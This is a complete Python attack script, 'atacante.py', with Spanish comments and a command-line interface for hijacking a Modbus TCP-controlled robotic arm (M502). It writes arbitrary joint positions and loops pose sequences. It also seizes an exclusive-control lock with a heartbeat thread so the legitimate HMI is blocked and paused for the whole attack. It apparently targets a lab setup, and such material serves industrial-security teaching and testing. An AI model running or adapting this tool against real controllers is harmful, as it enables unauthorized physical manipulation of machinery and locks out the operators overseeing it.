#!/usr/bin/env python3
"""
atacante.py — Control Modbus / Brazo Robotico M502  (v4 — con Control Exclusivo)
=================================================================================
Uso basico:
  python3 atacante.py --rhost 10.197.4.77 --read
  python3 atacante.py --rhost 10.197.4.77 --preset grab
  python3 atacante.py --rhost 10.197.4.77 \\
      --data_address 100,101,102,103,104,105 \\
      --sequence -s1 138,144,112,75,153,97 -s2 10,118,90,75,105,121 \\
      --delay 2 --loop

Control exclusivo (lock):
  Sin --lock  → comparte el bus con el HMI (ultimo que escribe gana)
  Con  --lock → adquiere control exclusivo antes de la secuencia;
                el HMI detecta la excepcion 0x06 y pausa su loop
                hasta que el ataque termine y el lock se libere.

  python3 atacante.py --rhost 10.197.4.77 --lock \\
      --sequence -s1 90,90,90,90,90,90 \\
      --data_address 100,101,102,103,104,105 \\
      --delay 2 --loop

Modo interactivo:
  python3 atacante.py --rhost 10.197.4.77 --interactive
"""

import argparse
import sys
import time
import signal
import threading
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException

# ─── Registros de control exclusivo (deben coincidir con el firmware) ───────
REG_LOCK_CMD    = 200   # escribir 0xA5A5 = solicitar lock, 0x0000 = liberar
REG_LOCK_TOKEN  = 201   # token asignado por el PLC (solo lectura)
REG_LOCK_TTL    = 202   # tiempo de vida en segundos (solo lectura)
REG_LOCK_OWNER  = 203   # ID de sesion duenia (solo lectura)
LOCK_MAGIC      = 0xA5A5
LOCK_TTL_SEG    = 15    # debe coincidir con LOCK_TTL_SECONDS del firmware

# ─── Joints ─────────────────────────────────────────────────────────────────
JOINTS = {
    100: "Pinza",
    101: "Rot.Pinza",
    102: "Muneca",
    103: "Codo",
    104: "Hombro",
    105: "Base",
}

# ─── Poses predefinidas ──────────────────────────────────────────────────────
PRESETS = {
    "home":    {"desc": "Reposo",         "vals": [0,  90, 90,  90, 90,   0]},
    "grab":    {"desc": "Agarrar objeto", "vals": [80,  0, 45, 120, 60,   0]},
    "wave":    {"desc": "Saludar",        "vals": [50,  0, 30, 150, 45,  90]},
    "release": {"desc": "Soltar objeto",  "vals": [0,   0, 45, 120, 60,   0]},
    "demo":    {"desc": "Exhibicion",     "vals": [30, 45, 60, 100, 75, 180]},
}

ADDRS_DEFAULT = list(JOINTS.keys())

# ─── Control de ejecucion ────────────────────────────────────────────────────
_running = True

def _sig_handler(sig, frame):
    global _running
    _running = False
    print("\n[!] Ctrl+C — parando...")

signal.signal(signal.SIGINT, _sig_handler)


# ─── Conexion ────────────────────────────────────────────────────────────────
def connect(host, port):
    client = ModbusTcpClient(host, port=port, timeout=3)
    if not client.connect():
        print(f"[!] No se pudo conectar a {host}:{port}")
        sys.exit(1)
    print(f"[+] Conectado a {host}:{port}")
    return client


def make_client(host, port):
    """Cliente sin conectar para modo connect-per-write."""
    return ModbusTcpClient(host, port=port, timeout=3)


# ─── Control exclusivo ───────────────────────────────────────────────────────
def lock_leer_estado(client):
    """Lee REG 200-203. Retorna dict o None si falla."""
    try:
        r = client.read_holding_registers(REG_LOCK_CMD, count=4)
        if r.isError():
            return None
        cmd, token, ttl, owner = r.registers
        return {
            "active": cmd == LOCK_MAGIC,
            "token":  token,
            "ttl":    ttl,
            "owner":  owner,
        }
    except Exception as e:
        print(f"[LOCK] Error leyendo estado: {e}")
        return None


def lock_adquirir(client):
    """
    Solicita el control exclusivo (REG 200 = 0xA5A5).
    Retorna True si se concede, False si lo tiene otro cliente.
    El firmware asigna el lock a la sesion TCP que lo solicita.
    """
    try:
        r = client.write_register(REG_LOCK_CMD, LOCK_MAGIC)
        if r.isError():
            estado = lock_leer_estado(client)
            if estado and estado["active"]:
                print(f"[LOCK] Lock rechazado — lo tiene la sesion #{estado['owner']} "
                      f"(TTL: {estado['ttl']}s)")
            else:
                print("[LOCK] Lock rechazado por el firmware")
            return False
        # Verificar que el firmware nos lo concedio
        estado = lock_leer_estado(client)
        if estado and estado["active"]:
            print(f"[LOCK] Control exclusivo ADQUIRIDO "
                  f"(Token=0x{estado['token']:04X}, TTL={estado['ttl']}s)")
            print(f"[LOCK] El HMI legitimo recibira excepcion 0x06 y pausara su loop.")
            return True
        return False
    except Exception as e:
        print(f"[LOCK] Error adquiriendo lock: {e}")
        return False


def lock_liberar(client):
    """Libera el control exclusivo (REG 200 = 0x0000)."""
    try:
        r = client.write_register(REG_LOCK_CMD, 0x0000)
        if not r.isError():
            print("[LOCK] Control exclusivo LIBERADO — HMI legitimo reanuda en ~1s")
    except Exception as e:
        print(f"[LOCK] Error liberando lock: {e}")


def lock_renovar_hilo(client, intervalo):
    """
    Hilo daemon que renueva el lock cada <intervalo> segundos
    escribiendo 0xA5A5 en REG 200 (heartbeat).
    El firmware reinicia el TTL con cada escritura del duenio.
    """
    global _running
    while _running:
        time.sleep(intervalo)
        if not _running:
            break
        try:
            client.write_register(REG_LOCK_CMD, LOCK_MAGIC)
        except Exception:
            pass


# ─── Leer estado ─────────────────────────────────────────────────────────────
def read_all(client, addrs, unit=1):
    resp = client.read_holding_registers(addrs[0], count=len(addrs), device_id=unit)
    if resp.isError():
        print("[!] Error al leer registros")
        return

    print(f"\n  {'Addr':<6} {'Joint':<12} {'Val':>5}  Posicion")
    print("  " + "-" * 50)
    for addr, val in zip(addrs, resp.registers):
        nombre = JOINTS.get(addr, f"REG{addr}")
        bar    = "[" + "#" * int(val / 5) + "." * (36 - int(val / 5)) + "]"
        print(f"  {addr:<6} {nombre:<12} {val:>5}  {bar} {val}deg")
    print()


# ─── Escribir registros ──────────────────────────────────────────────────────
def write(client, addresses, values, unit=1, verbose=True, host=None, port=None):
    """
    Escribe registros Modbus.
    Si el cliente no tiene socket abierto (transient/connect-per-write):
      abre conexion, escribe y cierra.
    Si el cliente ya esta conectado (persistente, modo --lock):
      usa la conexion existente para mantener la sesion de lock.
    """
    pairs = sorted(zip(addresses, values))
    addrs = [p[0] for p in pairs]
    vals  = [max(0, min(180, p[1])) for p in pairs]

    contiguous = len(addrs) == 1 or all(
        addrs[i+1] - addrs[i] == 1 for i in range(len(addrs)-1)
    )

    transient = not client.is_socket_open()
    if transient:
        for intento in range(1, 4):
            if client.connect():
                break
            print(f"  [!] Conexion fallida (intento {intento}/3), reintentando...")
            time.sleep(0.5)
        else:
            print("  [!] No se pudo conectar para escribir, pose omitida.")
            return

    try:
        if contiguous:
            r = client.write_registers(addrs[0], vals, device_id=unit)
            if hasattr(r, 'isError') and r.isError():
                print(f"  [!] Error Modbus al escribir (el PLC rechazo la escritura)")
                return
        else:
            for addr, val in zip(addrs, vals):
                client.write_registers(addr, [val], device_id=unit)

        if verbose:
            resumen = "  ".join(
                f"{JOINTS.get(a, str(a))}={v}deg" for a, v in zip(addrs, vals)
            )
            print(f"  [>] {resumen}")
    except Exception as e:
        print(f"  [!] Error al escribir: {e}")
    finally:
        if transient:
            client.close()


# ─── Secuencia ───────────────────────────────────────────────────────────────
def run_sequence(host, port, steps, addrs, delay, reps, loop,
                 use_lock=False, unit=1):
    """
    Ejecuta la secuencia de poses.

    use_lock=False (default):
        Modo connect-per-write. Cada pose abre TCP, escribe y cierra.
        El loop del HMI sigue corriendo pero los valores se mezclan.

    use_lock=True:
        Usa una conexion persistente para mantener el lock exclusivo.
        El firmware bloquea las escrituras del HMI con excepcion 0x06.
        El HMI detecta el bloqueo y pausa su loop automaticamente.
        Al hacer Ctrl+C el lock se libera y el HMI reanuda.
    """
    global _running

    total_steps = len(steps)
    ciclo = 0

    modo_str = "lock exclusivo (HMI pausado)" if use_lock else "connect-per-write (bus compartido)"
    print(f"\n[*] Secuencia: {total_steps} pose(s) | delay={delay}s | "
          f"{'loop infinito' if loop else f'reps={reps}'}")
    print(f"    Modo       : {modo_str}")
    print(f"    Addresses  : {addrs}")
    for i, s in enumerate(steps):
        nombres = [JOINTS.get(a, str(a)) for a in addrs]
        pose_str = "  ".join(f"{n}={v}" for n, v in zip(nombres, s))
        print(f"    S{i+1}         : {pose_str}")
    print()

    if use_lock:
        # ── MODO LOCK: conexion persistente ──────────────────────────
        client = connect(host, port)
        try:
            if not lock_adquirir(client):
                print("[!] No se pudo adquirir el lock. Abortando.")
                client.close()
                return

            # Hilo que renueva el lock cada TTL/3 segundos
            renovar_cada = max(2, LOCK_TTL_SEG // 3)
            hilo_renov = threading.Thread(
                target=lock_renovar_hilo,
                args=(client, renovar_cada),
                daemon=True
            )
            hilo_renov.start()
            print(f"[LOCK] Heartbeat activo cada {renovar_cada}s")

            while _running:
                ciclo += 1
                print(f"  [Ciclo {ciclo}]")

                for idx, step in enumerate(steps):
                    if not _running:
                        break
                    vals = step[:len(addrs)]
                    ts = time.strftime("%H:%M:%S")
                    print(f"    {ts}  Pose S{idx+1}/{total_steps}", end="  ")
                    write(client, addrs, vals, unit, verbose=True)

                    restante = delay
                    while restante > 0 and _running:
                        time.sleep(min(0.1, restante))
                        restante -= 0.1

                if not loop and ciclo >= reps:
                    break

        finally:
            _running = False
            lock_liberar(client)
            client.close()

    else:
        # ── MODO CONNECT-PER-WRITE: sin lock ─────────────────────────
        while _running:
            ciclo += 1
            print(f"  [Ciclo {ciclo}]")

            for idx, step in enumerate(steps):
                if not _running:
                    break
                vals = step[:len(addrs)]
                ts = time.strftime("%H:%M:%S")
                print(f"    {ts}  Pose S{idx+1}/{total_steps}", end="  ")

                client = make_client(host, port)
                write(client, addrs, vals, unit, verbose=True)

                restante = delay
                while restante > 0 and _running:
                    time.sleep(min(0.1, restante))
                    restante -= 0.1

            if not loop and ciclo >= reps:
                break

    print(f"\n[+] Secuencia finalizada ({ciclo} ciclo(s)).")
    if use_lock:
        print("[+] Lock liberado — HMI legitimo reanuda automaticamente.")


# ─── Modo interactivo ────────────────────────────────────────────────────────
def interactive(client, host, port, addrs, unit, use_lock):
    global _running

    if use_lock:
        if lock_adquirir(client):
            renovar_cada = max(2, LOCK_TTL_SEG // 3)
            threading.Thread(
                target=lock_renovar_hilo,
                args=(client, renovar_cada),
                daemon=True
            ).start()
            print(f"[LOCK] Heartbeat activo cada {renovar_cada}s")
        else:
            print("[LOCK] No se pudo adquirir lock. Continuando sin lock.")

    while _running:
        print("\n" + "=" * 50)
        print("  M502 Modbus CLI — Modo Interactivo")
        if use_lock:
            print("  [LOCK ACTIVO — HMI pausado mientras estes aqui]")
        print("=" * 50)
        print("  1) Leer estado actual")
        print("  2) Leer estado del lock (REG 200-203)")
        print("  3) Escribir registro individual")
        print("  4) Escribir todos los registros")
        print("  5) Aplicar preset")
        print("  6) Ejecutar secuencia manual")
        print("  0) Salir")
        print("-" * 50)

        op = input("  Opcion: ").strip()

        if op == "1":
            read_all(client, addrs, unit)

        elif op == "2":
            estado = lock_leer_estado(client)
            if estado:
                print(f"\n  Lock activo : {estado['active']}")
                print(f"  Duenio (ID) : {estado['owner']}")
                print(f"  Token       : 0x{estado['token']:04X}")
                print(f"  TTL restante: {estado['ttl']}s")
            else:
                print("  [!] No se pudo leer el estado del lock")

        elif op == "3":
            for addr in addrs:
                print(f"    {addr}  {JOINTS.get(addr, '?')}")
            try:
                addr = int(input("  Direccion: "))
                val  = int(input("  Valor (0-180): "))
                write(client, [addr], [val], unit)
            except ValueError:
                print("[!] Valor invalido")

        elif op == "4":
            try:
                raw = input(f"  Valores para {addrs} (coma): ")
                vals = [int(x.strip()) for x in raw.split(",")]
                if len(vals) != len(addrs):
                    print(f"[!] Necesitas {len(addrs)} valores")
                else:
                    write(client, addrs, vals, unit)
            except ValueError:
                print("[!] Valores invalidos")

        elif op == "5":
            for k, v in PRESETS.items():
                print(f"    {k:<10}  {v['desc']}  {v['vals']}")
            name = input("  Nombre: ").strip()
            if name in PRESETS:
                vals = PRESETS[name]["vals"][:len(addrs)]
                write(client, addrs, vals, unit)
            else:
                print("[!] Preset no encontrado")

        elif op == "6":
            steps = []
            i = 1
            while True:
                raw = input(f"  S{i} ({len(addrs)} valores, Enter=fin): ").strip()
                if not raw:
                    break
                try:
                    vals = [int(x.strip()) for x in raw.split(",")]
                    if len(vals) != len(addrs):
                        print(f"  [!] Necesitas {len(addrs)} valores")
                        continue
                    steps.append(vals)
                    i += 1
                except ValueError:
                    print("  [!] Solo numeros")
            if not steps:
                continue
            try:
                delay = float(input("  Delay entre poses (s): ") or "2")
                reps  = int(input("  Reps (0=loop): ") or "1")
            except ValueError:
                delay, reps = 2.0, 1
            loop = reps == 0
            if loop:
                reps = 1
            # En interactivo siempre usamos la conexion persistente (lock ya activo)
            while _running:
                for idx, step in enumerate(steps):
                    if not _running:
                        break
                    ts = time.strftime("%H:%M:%S")
                    print(f"  {ts}  Pose S{idx+1}", end="  ")
                    write(client, addrs, step[:len(addrs)], unit)
                    time.sleep(delay)
                if not loop:
                    reps -= 1
                    if reps <= 0:
                        break

        elif op == "0":
            break

    if use_lock:
        lock_liberar(client)


# ─── CLI principal ───────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        prog="atacante.py",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=__doc__,
    )

    parser.add_argument("--rhost", required=True,         help="IP del PLC/ESP32")
    parser.add_argument("--port",  type=int, default=502, help="Puerto Modbus TCP (default 502)")
    parser.add_argument("--unit",  type=int, default=1,   help="Unit ID Modbus (default 1)")

    parser.add_argument("--lock", action="store_true",
                        help="Adquirir control exclusivo antes de actuar "
                             "(bloquea el loop del HMI durante el ataque; "
                             "se libera al hacer Ctrl+C o al terminar)")

    parser.add_argument("--data_address",   default=None,
                        help="Direcciones separadas por coma: 100,101,102,103,104,105")
    parser.add_argument("--data_registers", default=None,
                        help="Valores (0-180) separados por coma")

    parser.add_argument("--preset", choices=list(PRESETS.keys()), default=None)
    parser.add_argument("--read", action="store_true",
                        help="Leer estado actual de los registros")

    seq_group = parser.add_argument_group("sequence — secuencia de poses")
    seq_group.add_argument("--sequence", action="store_true")
    for n in range(1, 11):
        seq_group.add_argument(f"-s{n}", dest=f"s{n}", default=None, metavar="VALS")
    seq_group.add_argument("--delay", type=float, default=2.0)
    seq_group.add_argument("--reps",  type=int,   default=1)
    seq_group.add_argument("--loop",  action="store_true")

    parser.add_argument("--interactive", action="store_true")

    args = parser.parse_args()

    addrs = ([int(x.strip()) for x in args.data_address.split(",")]
             if args.data_address else ADDRS_DEFAULT)

    # Para --lock siempre usamos conexion persistente
    # Para el resto usamos connect-per-write o conexion puntual
    client = connect(args.rhost, args.port)

    try:
        if args.read:
            read_all(client, addrs, args.unit)

        elif args.preset:
            if args.lock:
                lock_adquirir(client)
            vals = PRESETS[args.preset]["vals"][:len(addrs)]
            write(client, addrs, vals, args.unit)

        elif args.interactive:
            interactive(client, args.rhost, args.port, addrs, args.unit, args.lock)

        elif args.sequence:
            steps = []
            for n in range(1, 11):
                raw = getattr(args, f"s{n}", None)
                if raw is None:
                    break
                try:
                    steps.append([int(x.strip()) for x in raw.split(",")])
                except ValueError:
                    print(f"[!] Valores invalidos en -s{n}")
                    sys.exit(1)
            if not steps:
                print("[!] --sequence requiere al menos -s1 VALS")
                sys.exit(1)
            for i, s in enumerate(steps):
                if len(s) != len(addrs):
                    print(f"[!] S{i+1}: {len(s)} valores pero --data_address tiene {len(addrs)}")
                    sys.exit(1)
            # Cerrar el cliente inicial y dejar que run_sequence maneje su propia conexion
            client.close()
            run_sequence(args.rhost, args.port, steps, addrs,
                         args.delay, args.reps, args.loop,
                         use_lock=args.lock, unit=args.unit)
            return

        elif args.data_registers:
            if args.lock:
                lock_adquirir(client)
            vals = [int(x.strip()) for x in args.data_registers.split(",")]
            if len(vals) != len(addrs):
                print(f"[!] {len(addrs)} addresses pero {len(vals)} valores")
                sys.exit(1)
            write(client, addrs, vals, args.unit)
            if args.lock:
                lock_liberar(client)

        else:
            parser.print_help()

    except ModbusException as e:
        print(f"[!] Error Modbus: {e}")
    finally:
        if client.is_socket_open():
            client.close()
        print("[+] Conexion cerrada.")


if __name__ == "__main__":
    main()
